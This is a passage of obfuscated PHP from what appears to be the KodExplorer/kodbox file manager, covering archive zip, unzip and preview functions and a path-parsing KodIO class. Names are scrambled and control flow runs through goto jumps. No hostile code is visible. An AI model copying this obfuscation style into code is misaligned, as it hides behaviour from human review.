TEMP_FILES)) { $D§§Š’¾ = $D¼ŒÈ¸‡À– = array(); recursion_dir($c£åÒõ·Ş, $D§§Š’¾, $D¼ŒÈ¸‡À–, 0); foreach ($D§§Š’¾ as $b§É¹ÓÔ©²) { del_dir($b§É¹ÓÔ©²); } foreach ($D¼ŒÈ¸‡À– as $DÇçÙ‹¬íä) { if ($DÇçÙ‹¬íä == $aŸšï˜¥µÁ) { continue; } del_file($DÇçÙ‹¬íä); } } return $a…ö¢ê™¹; } $a öåè¼±÷ = self::pathFather($e‚˜÷ÈÎ©À[$dƒÂãËÆ·[75]]); $a–øå÷ç¬Ø = self::move($a…ö¢ê™¹, $a öåè¼±÷, $Cò°µ ‚—); goto fÈÎÓÎÎ™; Fª‚„ÙÍÌø: $a…ö¢ê™¹ = $c£åÒõ·Ş . $CÓ¾Ğ’ç¶ . $dƒÂãËÆ·[91] . $F“²¢Ò•; $a…ö¢ê™¹ = get_filename_auto($a…ö¢ê™¹, $dƒÂãËÆ·[33], $Cò°µ ‚—); $aŸšï˜¥µÁ = self::iconvSystem($a…ö¢ê™¹); goto F¸˜Œğƒ „; fÔ¬¬¯œ«¥: if (count($D¼ŒÈ¸‡À–) > 1) { $d‚¿‰ß³ëÛ = IO::info(IO::pathFather($e‚˜÷ÈÎ©À[$dƒÂãËÆ·[75]])); $CÓ¾Ğ’ç¶ = $d‚¿‰ß³ëÛ[$dƒÂãËÆ·[28]]; } $c£åÒõ·Ş = $fª¶²ïÂÂ‡; if (!$c£åÒõ·Ş) { $c£åÒõ·Ş = get_path_father($e‚˜÷ÈÎ©À[$dƒÂãËÆ·[75]]); if (!$b¸ä»¹Ü½Æ && $B ƒ¾óÁÉ->getType() == $dƒÂãËÆ·[102]) { $c£åÒõ·Ş = get_path_father($B ƒ¾óÁÉ->path); } $CÆíƒÁöƒ  = IO::info($c£åÒõ·Ş); if (!$CÆíƒÁöƒ [$dƒÂãËÆ·[189]]) { show_json(LNG($dƒÂãËÆ·[1023]), !1); } } goto Fª‚„ÙÍÌø; f¤‰÷ã÷ç: $dƒÂãËÆ· =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B ƒ¾óÁÉ = self::init($d—•¦»°ôª[0][$dƒÂãËÆ·[75]]); $e‚˜÷ÈÎ©À = self::info($d—•¦»°ôª[0][$dƒÂãËÆ·[75]]); goto d°ç‚ôò²”; fÈÎÓÎÎ™: if (!$a–øå÷ç¬Ø) { del_dir($fª¶²ïÂÂ‡); show_json(LNG($dƒÂãËÆ·[1024]), !1); } del_dir($fª¶²ïÂÂ‡); return $a–øå÷ç¬Ø; goto cšõ®ïä¬Í; F¸˜Œğƒ „: foreach ($D¼ŒÈ¸‡À– as $c’ÄùºÙ²ƒ => $DöÆ“Ä²èÙ) { $D¼ŒÈ¸‡À–[$c’ÄùºÙ²ƒ] = self::iconvSystem($DöÆ“Ä²èÙ); } KodArchive::create($aŸšï˜¥µÁ, $D¼ŒÈ¸‡À–); if (!IO::exist($a…ö¢ê™¹)) { if ($fª¶²ïÂÂ‡) { del_dir($fª¶²ïÂÂ‡); } show_json(LNG($dƒÂãËÆ·[1024]), !1); } goto añ²Ã÷ªİ; d°ç‚ôò²”: $fª¶²ïÂÂ‡ = !1; if (!$b¸ä»¹Ü½Æ && $B ƒ¾óÁÉ->getType() == $dƒÂãËÆ·[102]) { $D¼ŒÈ¸‡À– = self::zipFileList($d—•¦»°ôª); } else { $fª¶²ïÂÂ‡ = $b¸ä»¹Ü½Æ ? $b¸ä»¹Ü½Æ : TEMP_FILES . $dƒÂãËÆ·[1022] . time() . rand_string(8) . $dƒÂãËÆ·[8]; mk_dir($fª¶²ïÂÂ‡); $D¼ŒÈ¸‡À– = self::zipFileList($d—•¦»°ôª, $fª¶²ïÂÂ‡); } $CÓ¾Ğ’ç¶ = $e‚˜÷ÈÎ©À[$dƒÂãËÆ·[28]]; goto fÔ¬¬¯œ«¥; cšõ®ïä¬Í: } public static function unzip($D’İëˆÔâÜ, $dì¤Ñ£¬† = "\x72\x65\160\154\141\143\x65") { goto A·ôœ‡¹ÙŞ; F ÜÀ¶ÔÏæ: Hook::trigger($fÂ·¯çà´µ[1032], $BÜ…ó´¦); recursion_dir($BÜ…ó´¦, $fÂ©ëÁ¬ùƒ, $c¶²íÖŠÑ, 0); $Aõ­ÅäèÖù = array_merge($fÂ©ëÁ¬ùƒ, $c¶²íÖŠÑ); goto E†Ñğæ“î; DæáĞ¯Ã¨ê: if (!@file_exists(self::iconvSystem($E’»¨Ì§Õ”))) { $bÕ± Œğ“Â = self::localFilePath($eìŞÜÖ™ö, $FÎÙ‡‹”óÇ); $E’»¨Ì§Õ” = $bÕ± Œğ“Â ? $bÕ± Œğ“Â : parent::download($eìŞÜÖ™ö, $E’»¨Ì§Õ”); } $E’»¨Ì§Õ” = self::iconvSystem($E’»¨Ì§Õ”); $B‘åÁ„ = isset($D’İëˆÔâÜ[$fÂ·¯çà´µ[1027]]) ? $D’İëˆÔâÜ[$fÂ·¯çà´µ[1027]] : $fÂ·¯çà´µ[1028]; goto fê±¥Ñ³¼²; fê±¥Ñ³¼²: $BÏŠ—Ë´‘Å = KodArchive::extract($E’»¨Ì§Õ”, $BÜ…ó´¦ . $fÂ·¯çà´µ[8], $B‘åÁ„); self::archiveExt(); if (!$BÏŠ—Ë´‘Å[$fÂ·¯çà´µ[1029]]) { show_json($fÂ·¯çà´µ[1030] . $BÏŠ—Ë´‘Å[$fÂ·¯çà´µ[1031]], !1); } goto F ÜÀ¶ÔÏæ; cÚ´µÈÉ‰˜: if (!($dËš”Ü§†¯ = parent::info($eìŞÜÖ™ö))) { show_json(LNG($fÂ·¯çà´µ[1026]), !1); } if (!($eèÁ“öšÉÃ = parent::infoFull($D‹¢Ÿ‰»…))) { $D‹¢Ÿ‰»… = parent::mkdir($D‹¢Ÿ‰»…); $eèÁ“öšÉÃ = array($fÂ·¯çà´µ[75] => $D‹¢Ÿ‰»…); } else { if (isset($eèÁ“öšÉÃ[$fÂ·¯çà´µ[369]]) && trim($eèÁ“öšÉÃ[$fÂ·¯çà´µ[75]], $fÂ·¯çà´µ[8]) != trim($D‹¢Ÿ‰»…, $fÂ·¯çà´µ[8])) { $cì§‘¦†…½ = KodIO::make($eèÁ“öšÉÃ[$fÂ·¯çà´µ[463]]); $AßÓ´ƒ± = parent::fileNameAuto($cì§‘¦†…½, $eèÁ“öšÉÃ[$fÂ·¯çà´µ[28]], REPEAT_RENAME_FOLDER, !0); $D‹¢Ÿ‰»… = parent::mkdir($cì§‘¦†…½ . $AßÓ´ƒ±); $eèÁ“öšÉÃ = array($fÂ·¯çà´µ[75] => $D‹¢Ÿ‰»…); } } $D‹¢Ÿ‰»… = $eèÁ“öšÉÃ[$fÂ·¯çà´µ[75]]; goto e¤´ì¿Û·Ø; A·ôœ‡¹ÙŞ: $fÂ·¯çà´µ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eìŞÜÖ™ö = $D’İëˆÔâÜ[$fÂ·¯çà´µ[75]]; $D‹¢Ÿ‰»… = $D’İëˆÔâÜ[$fÂ·¯çà´µ[1025]]; goto cÚ´µÈÉ‰˜; e¤´ì¿Û·Ø: $dòÃ¸Â°ã = self::tmpFileName($dËš”Ü§†¯); $BÜ…ó´¦ = TEMP_FILES . $dòÃ¸Â°ã; del_dir($BÜ…ó´¦); goto e¤µàêöÉñ; e¤µàêöÉñ: mk_dir($BÜ…ó´¦); $FÎÙ‡‹”óÇ = self::fileExt($dËš”Ü§†¯); $E’»¨Ì§Õ” = $BÜ…ó´¦ . $fÂ·¯çà´µ[91] . $FÎÙ‡‹”óÇ; goto DæáĞ¯Ã¨ê; F“â¿Ë á¾: return !0; goto bÎ„ÔÚ…™è; E†Ñğæ“î: foreach ($Aõ­ÅäèÖù as $Døà“³Ë‘‹) { $Døà“³Ë‘‹ = self::iconvApp($Døà“³Ë‘‹); self::move($Døà“³Ë‘‹, $D‹¢Ÿ‰»…, $dì¤Ñ£¬†); } del_dir($BÜ…ó´¦); if (!$bÕ± Œğ“Â) { del_file($E’»¨Ì§Õ”); } goto F“â¿Ë á¾; bÎ„ÔÚ…™è: } public static function unzipList($d÷·Â¶®Ì¦) { goto dŒ¨ìïÍ¹‚; d²ï¹æ²İ: $eğïã§‡’Ï = json_encode($FĞ³¶‘â¦è[$bŒø„«âë[1031]]); self::setContent($f‹ù¿ùŞ•Ô, $eğïã§‡’Ï); if (count($FĞ³¶‘â¦è[$bŒø„«âë[1031]]) >= $A´¤ìÇ·óƒ) { show_json(sprintf(LNG($bŒø„«âë[1035]), count($FĞ³¶‘â¦è[$bŒø„«âë[1031]])), !1); } goto fÜèâ«Ÿñ…; f³øŠ›À×ç: self::archiveExt(); del_dir($AŠ­»ÀÃà¸); if (!$FĞ³¶‘â¦è[$bŒø„«âë[1029]]) { show_json($FĞ³¶‘â¦è[$bŒø„«âë[1031]], !1); } goto d²ï¹æ²İ; cİ¤¦„Â¡¯: $eöâ–áØ = self::info($FƒÓË×Ú¦); $fµ«ƒ‘ïËò = self::fileExt($eöâ–áØ); $dŒğ¼ÀÂÒÇ = self::tmpFileName($eöâ–áØ); goto bŒŠÚ‘áô; bŒŠÚ‘áô: if (isset($D©™‹¿Ó)) { $a¤ØÏ­»¡ = array($D©™‹¿Ó[$bŒø„«âë[75]], $D©™‹¿Ó[$bŒø„«âë[1033]], $D©™‹¿Ó[$bŒø„«âë[28]]); $bÛØŞ‡äØñ = md5(implode($bŒø„«âë[70], $a¤ØÏ­»¡)) . $bŒø„«âë[91] . get_path_ext($D©™‹¿Ó[$bŒø„«âë[28]]); } else { $a¤ØÏ­»¡ = array($eöâ–áØ[$bŒø„«âë[28]], $eöâ–áØ[$bŒø„«âë[75]], $eöâ–áØ[$bŒø„«âë[77]]); $bÛØŞ‡äØñ = md5(implode($bŒø„«âë[70], $a¤ØÏ­»¡)) . $bŒø„«âë[91] . $fµ«ƒ‘ïËò; } if ($A‰½åŠÍ‹Á == -1) { $f‹ù¿ùŞ•Ô = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\x56\151\145\167\x2f{$dŒğ¼ÀÂÒÇ}\x2f{$bÛØŞ‡äØñ}\56\154\x6f\x67"; $bï–Û·ïÏ = self::infoFull($f‹ù¿ùŞ•Ô); if ($bï–Û·ïÏ) { $f‹ù¿ùŞ•Ô = $bï–Û·ïÏ[$bŒø„«âë[75]]; $A£Ê¢‹º† = self::getContent($f‹ù¿ùŞ•Ô); if ($A£Ê¢‹º†) { $eğïã§‡’Ï = json_decode($A£Ê¢‹º†, !0); if (count($eğïã§‡’Ï) >= $A´¤ìÇ·óƒ) { show_json(sprintf(LNG($bŒø„«âë[1035]), count($eğïã§‡’Ï)), !1); } return $eğïã§‡’Ï; } } else { $f‹ù¿ùŞ•Ô = self::mkfile($f‹ù¿ùŞ•Ô); } } $AŠ­»ÀÃà¸ = TEMP_FILES . $dŒğ¼ÀÂÒÇ; goto d Ô©øöñ; dŒ¨ìïÍ¹‚: $bŒø„«âë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c¾ô—¯ˆ¿‡ = $d÷·Â¶®Ì¦[$bŒø„«âë[75]]; $A‰½åŠÍ‹Á = isset($d÷·Â¶®Ì¦[$bŒø„«âë[1033]]) ? $d÷·Â¶®Ì¦[$bŒø„«âë[1033]] : -1; goto F«Ó˜Ñ‚ÅÏ; fÜèâ«Ÿñ…: return $FĞ³¶‘â¦è[$bŒø„«âë[1031]]; goto d«šĞ£¿”; F«Ó˜Ñ‚ÅÏ: $A´¤ìÇ·óƒ = 50000; if (request_url_safe($c¾ô—¯ˆ¿‡)) { $D©™‹¿Ó = parse_url_query($c¾ô—¯ˆ¿‡); if (!isset($D©™‹¿Ó[$bŒø„«âë[75]])) { show_json($bŒø„«âë[1034], !1); } } $FƒÓË×Ú¦ = isset($D©™‹¿Ó) ? $D©™‹¿Ó[$bŒø„«âë[75]] : $c¾ô—¯ˆ¿‡; goto cİ¤¦„Â¡¯; d Ô©øöñ: if (!is_dir($AŠ­»ÀÃà¸)) { mk_dir($AŠ­»ÀÃà¸); } $A½ììˆâ‰Ç = $AŠ­»ÀÃà¸ . $bŒø„«âë[8] . $bÛØŞ‡äØñ; if (!@file_exists(self::iconvSystem($A½ììˆâ‰Ç))) { if (isset($D©™‹¿Ó)) { url_request($c¾ô—¯ˆ¿‡, $bŒø„«âë[1036], $A½ììˆâ‰Ç); } else { $A©ìŠ‘ñÑ = self::localFilePath($c¾ô—¯ˆ¿‡, $fµ«ƒ‘ïËò); $A½ììˆâ‰Ç = $A©ìŠ‘ñÑ ? $A©ìŠ‘ñÑ : self::download($c¾ô—¯ˆ¿‡, $A½ììˆâ‰Ç); } } goto B•âÍ•™ç×; B•âÍ•™ç×: $A½ììˆâ‰Ç = self::iconvSystem($A½ììˆâ‰Ç); if ($A‰½åŠÍ‹Á >= 0) { $b´ø¾ó‡Û¸ = isset($d÷·Â¶®Ì¦[$bŒø„«âë[1037]]) ? $d÷·Â¶®Ì¦[$bŒø„«âë[1037]] : !1; $dãµ©‘è = isset($d÷·Â¶®Ì¦[$bŒø„«âë[28]]) ? $d÷·Â¶®Ì¦[$bŒø„«âë[28]] : $bŒø„«âë[33]; KodArchive::filePreview($A½ììˆâ‰Ç, $A‰½åŠÍ‹Á, $b´ø¾ó‡Û¸, $dãµ©‘è); self::archiveExt(); die; } $FĞ³¶‘â¦è = KodArchive::listContent($A½ììˆâ‰Ç); goto f³øŠ›À×ç; d«šĞ£¿”: } private static function fileExt($C£ô¸ŞÊÕ) { $b¶øÓ„÷Õğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bƒ†Ğ„¥ÉŠ = $C£ô¸ŞÊÕ[$b¶øÓ„÷Õğ[160]]; if ($bƒ†Ğ„¥ÉŠ == $b¶øÓ„÷Õğ[1038]) { $FöœÃÓŸÚˆ = $b¶øÓ„÷Õğ[1039]; if (substr($C£ô¸ŞÊÕ[$b¶øÓ„÷Õğ[28]], -strlen($FöœÃÓŸÚˆ)) == $FöœÃÓŸÚˆ) { $bƒ†Ğ„¥ÉŠ = $b¶øÓ„÷Õğ[1040]; } } self::archiveExt($bƒ†Ğ„¥ÉŠ); return $bƒ†Ğ„¥ÉŠ; } private static function zipFileList($A¦´‰‘§æ, $e’ì£×ÎÔ = false) { $F×¯Ú™—ˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eİáëãÔ¥ò = array(); foreach ($A¦´‰‘§æ as $BÀğÓ«¿å) { $c‘¡ñ‘ô™¢ = $BÀğÓ«¿å[$F×¯Ú™—ˆ[75]]; if ($e’ì£×ÎÔ) { $c‘¡ñ‘ô™¢ = self::copy($BÀğÓ«¿å[$F×¯Ú™—ˆ[75]], $e’ì£×ÎÔ, $F×¯Ú™—ˆ[746]); } else { $Dì…á¾ˆ„¶ = self::init($BÀğÓ«¿å[$F×¯Ú™—ˆ[75]]); if ($Dì…á¾ˆ„¶->getType() == $F×¯Ú™—ˆ[102]) { $c‘¡ñ‘ô™¢ = $Dì…á¾ˆ„¶->path; } } if ($c‘¡ñ‘ô™¢ && self::local()->exist($c‘¡ñ‘ô™¢)) { $eİáëãÔ¥ò[$BÀğÓ«¿å[$F×¯Ú™—ˆ[75]]] = $c‘¡ñ‘ô™¢; } } if (!empty($eİáëãÔ¥ò)) { return array_values($eİáëãÔ¥ò); } show_json(LNG($F×¯Ú™—ˆ[1041]), !1); } public static function tmpFileName($A•ÙŠ”ˆˆñ) { $aÛÅƒìŞ› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fï—Íß§Ú = array($A•ÙŠ”ˆˆñ[$aÛÅƒìŞ›[28]], $A•ÙŠ”ˆˆñ[$aÛÅƒìŞ›[75]], $A•ÙŠ”ˆˆñ[$aÛÅƒìŞ›[77]], $A•ÙŠ”ˆˆñ[$aÛÅƒìŞ›[461]]); return md5(implode($aÛÅƒìŞ›[70], $fï—Íß§Ú)); } private static function localFilePath($E»´âêó‘ß, $añÇíŠ­ôÓ) { goto b‰ ›ìÄ£È; b‰ ›ìÄ£È: $aÊÂ‘ø“ˆ£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($añÇíŠ­ôÓ == $aÊÂ‘ø“ˆ£[1042] && strtoupper(substr(PHP_OS, 0, 3)) == $aÊÂ‘ø“ˆ£[1043]) { return !1; } $BÏì÷Ô¹¡º = KodIO::parse($E»´âêó‘ß); goto fŒ¼ôĞ÷¯ğ; fŒ¼ôĞ÷¯ğ: if ($BÏì÷Ô¹¡º[$aÊÂ‘ø“ˆ£[29]] == KodIO::KOD_SOURCE) { $b‚±î›…ßî = Model($aÊÂ‘ø“ˆ£[754])->fileInfoGet(KodIO::sourceID($E»´âêó‘ß)); if (!$b‚±î›…ßî[$aÊÂ‘ø“ˆ£[75]]) { show_json($aÊÂ‘ø“ˆ£[1044], !1); } $E»´âêó‘ß = $b‚±î›…ßî[$aÊÂ‘ø“ˆ£[75]]; } $Fá¡Ó•Ê = self::init($E»´âêó‘ß); $E†ßëØñ‡Ë = $Fá¡Ó•Ê->getType(); goto CŸç‹¼ÂÒ; CŸç‹¼ÂÒ: if ($E†ßëØñ‡Ë == $aÊÂ‘ø“ˆ£[102] || $E†ßëØñ‡Ë == $aÊÂ‘ø“ˆ£[1045]) { if (!$Fá¡Ó•Ê->exist($Fá¡Ó•Ê->path)) { show_json(LNG($aÊÂ‘ø“ˆ£[101]), !1); } return $Fá¡Ó•Ê->path; } return !1; goto b®¿Ş¹Í…‡; b®¿Ş¹Í…‡: } private static function archiveExt($Còõºë‘ › = '') { $GLOBALS[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1046]] = $Còõºë‘ ›; } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\162\x52\x65\x63\171\143\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\x46\x69\x6c\145\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\x69\x6c\145\124\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\x52\157\157\164\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\163\145\x72\x53\150\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\x53\150\x61\x72\145\x4c\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\145\x54\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\145\x49\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\x65\x49\164\x65\x6d\114\151\156\x6b\x7d"; const KOD_SEARCH = "\173\x73\145\x61\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\153\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\173\x75\x73\145\162\122\145\x6e\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\145\x72\175"; public static function typeList() { $eÚàÁˆ¬• =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($eÚàÁˆ¬•[1047] => self::KOD_SOURCE, $eÚàÁˆ¬•[1048] => self::KOD_USER_RECYCLE, $eÚàÁˆ¬•[1049] => self::KOD_USER_FAV, $eÚàÁˆ¬•[1050] => self::KOD_USER_FILE_TAG, $eÚàÁˆ¬•[1051] => self::KOD_USER_FILE_TYPE, $eÚàÁˆ¬•[1052] => self::KOD_GROUP_ROOT_SELF, $eÚàÁˆ¬•[1053] => self::KOD_USER_SHARE, $eÚàÁˆ¬•[1054] => self::KOD_USER_SHARE_LINK, $eÚàÁˆ¬•[1055] => self::KOD_USER_SHARE_TO_ME, $eÚàÁˆ¬•[1056] => self::KOD_SHARE_ITEM, $eÚàÁˆ¬•[1057] => self::KOD_SHARE_LINK, $eÚàÁˆ¬•[1058] => self::KOD_SEARCH, $eÚàÁˆ¬•[1059] => self::KOD_BLOCK, $eÚàÁˆ¬•[1060] => self::KOD_IO, $eÚàÁˆ¬•[1061] => self::KOD_USER_RECENT, $eÚàÁˆ¬•[1062] => self::KOD_USER_DRIVER); } public static function parse($fòË™µ„°™) { goto fÄíÅ­ŒòÈ; fÄíÅ­ŒòÈ: $bÒ¿¡“§ºê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fòË™µ„°™ = self::clear($fòË™µ„°™); $F˜•İ··®Š = array_values(self::typeList()); goto B…’°½æ™‰; B…’°½æ™‰: preg_match($bÒ¿¡“§ºê[1063], $fòË™µ„°™, $Aá‡ƒ³µ¢Œ); $c±Ë«Ò¢ÜÌ = array($bÒ¿¡“§ºê[388] => !1, $bÒ¿¡“§ºê[1064] => !1, $bÒ¿¡“§ºê[385] => !1, $bÒ¿¡“§ºê[75] => $fòË™µ„°™, $bÒ¿¡“§ºê[1010] => !1, $bÒ¿¡“§ºê[1009] => $bÒ¿¡“§ºê[33]); if (is_array($Aá‡ƒ³µ¢Œ) && count($Aá‡ƒ³µ¢Œ) == 5) { $f‚ò“Çæ‰ = $bÒ¿¡“§ºê[1065] . $Aá‡ƒ³µ¢Œ[2] . $bÒ¿¡“§ºê[315]; if (in_array($f‚ò“Çæ‰, $F˜•İ··®Š)) { $c±Ë«Ò¢ÜÌ[$bÒ¿¡“§ºê[1010]] = $Aá‡ƒ³µ¢Œ[1]; $c±Ë«Ò¢ÜÌ[$bÒ¿¡“§ºê[29]] = $f‚ò“Çæ‰; $c±Ë«Ò¢ÜÌ[$bÒ¿¡“§ºê[1066]] = substr($f‚ò“Çæ‰, 1, -1); $c±Ë«Ò¢ÜÌ[$bÒ¿¡“§ºê[367]] = $Aá‡ƒ³µ¢Œ[3]; } $c±Ë«Ò¢ÜÌ[$bÒ¿¡“§ºê[1009]] = $Aá‡ƒ³µ¢Œ[4]; } goto CŒùÄÖïî; CŒùÄÖïî: $fÖ£²Š†Ô = array($bÒ¿¡“§ºê[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $c±Ë«Ò¢ÜÌ[$bÒ¿¡“§ºê[1067]] = in_array($c±Ë«Ò¢ÜÌ[$bÒ¿¡“§ºê[29]], $fÖ£²Š†Ô); return $c±Ë«Ò¢ÜÌ; goto CÀ‘à¹’‡; CÀ‘à¹’‡: } public static function clear($B½…šÊì¹Ş) { goto b­„âƒÃ×; c’Åñ³ÂŞÏ: $CÒÓ¦§Â = $Aõ±»»«»[1068]; if (substr($B½…šÊì¹Ş, 0, 3) == $Aõ±»»«»[1069]) { $B½…šÊì¹Ş = substr($B½…šÊì¹Ş, 3); } while (strstr($B½…šÊì¹Ş, $CÒÓ¦§Â)) { $B½…šÊì¹Ş = str_replace($CÒÓ¦§Â, $Aõ±»»«»[8], $B½…šÊì¹Ş); } goto a×ÕÊË©Ö; a×ÕÊË©Ö: $B½…šÊì¹Ş = preg_replace($Aõ±»»«»[1070], $Aõ±»»«»[8], $B½…šÊì¹Ş); if ($B½…šÊì¹Ş == $Aõ±»»«»[8]) { return $Aõ±»»«»[8]; } $B½…šÊì¹Ş = rtrim($B½…šÊì¹Ş, $Aõ±»»«»[8]); goto eèÅ¡‘æ†; eèÅ¡‘æ†: return $B½…šÊì¹Ş; goto dÊƒ«‚ÄŸ; b­„âƒÃ×: $Aõ±»»«» =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B½…šÊì¹Ş = str_replace(array($Aõ±»»«»[989], $Aõ±»»«»[217]), $Aõ±»»«»[50], $B½…šÊì¹Ş); $B½…šÊì¹Ş = str_replace($Aõ±»»«»[93], $Aõ±»»«»[8], $B½…šÊì¹Ş); goto c’Åñ³ÂŞÏ; dÊƒ«‚ÄŸ: } public static function sourceID($D‡ó²Éù…Æ) { $AÖÇ‰·Öôí =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bÖØ…ˆŒÕÒ = self::parse($D‡ó²Éù…Æ); if ($bÖØ…ˆŒÕÒ[$AÖÇ‰·Öôí[29]] !== self::KOD_SOURCE) { show_json(LNG($AÖÇ‰·Öôí[1071]), !1); } return $bÖØ…ˆŒÕÒ[$AÖÇ‰·Öôí[367]]; } public static function make($f•¯ğ¹½…) { if (!$f•¯ğ¹½…) { return !1; } return self::makePath(self::KOD_SOURCE, intval($f•¯ğ¹½…)); } public static function makeShare($E’æÛæŒš‘, $Dù·½—Ô½Å) { return self::makePath(self::KOD_SHARE_ITEM, $E’æÛæŒš‘, $Dù·½—Ô½Å); } public static function makeFileTypePath($f¿ŠÌ´İµÊ) { return self::makePath(self::KOD_USER_FILE_TYPE, $f¿ŠÌ´İµÊ); } public static function makeFileTagPath($fŠ°°¬ëÜæ) { return self::makePath(self::KOD_USER_FILE_TAG, $fŠ°°¬ëÜæ); } public static function makePath($BÆ½°±Ì¥, $F®çö´¼Ã¶ = '', $F¶ùÒ™æ­ = '') { $aßÉ¾ë‘ª =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B‘İíì±§Ò = substr($BÆ½°±Ì¥, 1, -1); $dÅ­ğ¨¬ª“ = $aßÉ¾ë‘ª[1072] . $B‘İíì±§Ò . $aßÉ¾ë‘ª[1073] . $F®çö´¼Ã¶ . $aßÉ¾ë‘ª[1074]; $dÅ­ğ¨¬ª“ = $F¶ùÒ™æ­ ? $dÅ­ğ¨¬ª“ . $F¶ùÒ™æ­ . $aßÉ¾ë‘ª[8] : $dÅ­ğ¨¬ª“; return $dÅ­ğ¨¬ª“; } public static function hashPath($eÀøĞÌíâÄ) { $d­¼¸µø‘Ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D®İõ¥Í¼ = is_array($eÀøĞÌíâÄ) ? $eÀøĞÌíâÄ : IO::info($eÀøĞÌíâÄ); $D„¤Å´÷‰« = _get($D®İõ¥Í¼, $d­¼¸µø‘Ò[1075], $d­¼¸µø‘Ò[33]); if (!$D„¤Å´÷‰«) { $F¨‡ÇØ¦ • = KodIO::parse($D®İõ¥Í¼[$d­¼¸µø‘Ò[75]]); if (!$F¨‡ÇØ¦ •[$d­¼¸µø‘Ò[29]]) { $D„¤Å´÷‰« = IO::hashSimple($D®İõ¥Í¼[$d­¼¸µø‘Ò[75]]); } } if (!$D„¤Å´÷‰«) { $D„¤Å´÷‰« = md5($D®İõ¥Í¼[$d­¼¸µø‘Ò[75]] . $D®İõ¥Í¼[$d­¼¸µø‘Ò[77]] . $D®İõ¥Í¼[$d­¼¸µø‘Ò[107]]); } return $D„¤Å´÷‰«; } public static function initSystemPath() { $B¿Ú‹›£Áõ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (defined($B¿Ú‹›£Áõ[1076])) { return; } define($B¿Ú‹›£Áõ[1076], self::systemPath($B¿Ú‹›£Áõ[1077])); define($B¿Ú‹›£Áõ[1078], self::systemPath($B¿Ú‹›£Áõ[1079])); define($B¿Ú‹›£Áõ[1080], self::systemPath($B¿Ú‹›£Áõ[1081])); define($B¿Ú‹›£Áõ[1082], self::systemPath($B¿Ú‹›£Áõ[1083])); } private static function systemPath($cƒöˆ†·Æè) { goto A•£ÁŒ°÷Õ; A‰Æ…µÈì: if ($eªøŒÛ”ì) { return $eªøŒÛ”ì; } if ($cƒöˆ†·Æè == $có®”á™Î[1077]) { $eªøŒÛ”ì = self::make(Model($có®”á™Î[754])->systemRootPathAdd($có®”á™Î[1086])); } else { $eªøŒÛ”ì = self::systemPath($có®”á™Î[1077]); $A ³š°Õã = self::sourceID($eªøŒÛ”ì); $eªøŒÛ”ì = self::make(Model($có®”á™Î[754])->mkdir($A ³š°Õã, $cƒöˆ†·Æè)); } Model($có®”á™Î[1085])->set($dùƒË´ğ°, $eªøŒÛ”ì); goto D–‹é­¿‰; A•£ÁŒ°÷Õ: $có®”á™Î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dùƒË´ğ° = $có®”á™Î[1084] . ucfirst($cƒöˆ†·Æè); $eªøŒÛ”ì = Model($có®”á™Î[1085])->get($dùƒË´ğ°); goto A‰Æ…µÈì; D–‹é­¿‰: return $eªøŒÛ”ì; goto f°Ä¢á‰ÈÈ; f°Ä¢á‰ÈÈ: } public static function systemFolder($A¿ñßÂÎÄ) { $dõãàãÛµ¢ = IO_PATH_SYSTEM_SOURCE . $A¿ñßÂÎÄ; $F†ŠŸÀñõ¤ = Cache::get($dõãàãÛµ¢); if (!$F†ŠŸÀñõ¤) { $EòÎ‰–©ß = IO::infoFull($dõãàãÛµ¢); if (!$EòÎ‰–©ß) { $F†ŠŸÀñõ¤ = IO::mkdir($dõãàãÛµ¢, REPEAT_SKIP); } else { $F†ŠŸÀñõ¤ = $EòÎ‰–©ß[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]]; } Cache::set($dõãàãÛµ¢, $F†ŠŸÀñõ¤, 3600 * 10); } return $F†ŠŸÀñõ¤; } public static function defaultDriver() { return Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][697])->defaultDriver(); } public static function defaultIO() { $b™ÓÑËìôÄ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Cã‚Ó±ëæ½ = self::defaultDriver(); return $b™ÓÑËìôÄ[1087] . $Cã‚Ó±ëæ½[$b™ÓÑËìôÄ[367]] . $b™ÓÑËìôÄ[1074]; } public static function defaultDriverInit() { static $fõ‡¥éÙõ° = false; if ($fõ‡¥éÙõ°) { return $fõ‡¥éÙõ°; 